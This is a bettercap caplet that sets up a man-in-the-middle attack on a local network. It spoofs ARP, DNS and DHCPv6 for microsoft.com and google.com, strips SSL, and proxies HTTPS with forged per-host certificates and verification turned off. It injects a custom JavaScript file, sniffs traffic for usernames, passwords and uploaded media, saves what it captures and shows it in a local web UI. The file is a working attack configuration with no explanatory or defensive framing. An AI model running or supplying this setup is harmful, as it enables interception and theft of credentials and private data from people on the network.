# Setting the domains we want to target
set dns.spoof.domains microsoft.com, google.com
set dhcp6.spoof.domains microsoft.com, google.com

# Set up HTTP server path to serve any content (including UI page)
set http.server.path /usr/local/share/bettercap/ui
# Display captured data in the UI dynamically (serve the captured data via HTTP UI)
set api.rest.address 127.0.0.1
set api.rest.port 8081
set http.server.address 127.0.0.1
set api.rest.username aio
set api.rest.password cap
api.rest on
http.server on

# Enable SSL stripping to intercept HTTPS traffic
set https.proxy.sslstrip true
https.proxy on

# Set a custom JavaScript file to enhance capture functionality
set http.proxy.script C:\ProgramData\bettercap\caplets\bk-aio\AIO.js

# Enable DNS and DHCPv6 spoofing to redirect traffic to us
dhcp6.spoof on
dns.spoof on

# Enable network sniffing and capture specific patterns in HTTP traffic (username, password, image uploads, video uploads)
set net.sniff.regexp .*username=.*|.*password=.*|.*multipart/form-data.*|.*image.*|.*video.*

# Set output files for storing captured data
set net.sniff.output /usr/local/share/bettercap/captured-data/captured_data.cap
set net.sniff.output.txt /usr/local/share/bettercap/captured-data/captured_data.txt

# Enable ARP spoofing for MITM attack
arp.spoof on

# Enable traffic sniffing
net.sniff on

# Enable dynamic certificate generation for multiple domains
set https.proxy.cert C:/ProgramData/bettercap/caplets/bk-aio/Certs/%{host}.pem  # Use domain name for cert file
set https.proxy.key C:/ProgramData/bettercap/caplets/bk-aio/Certs/%{host}-key.pem  # Use domain name for key file
set https.proxy.verify false  # Disable verification for intercepting SSL


# Custom prompt for IPv6 (optional)
set $ {by}{fw}{cidr} {fb}> {env.iface.ipv6} {reset} {bold}Â» {reset}

# Clear events and buffer
events.clear
clear

# Updated UI to include custom HTML
ui.update C:/usr/local/share/bettercap/ui/captured.html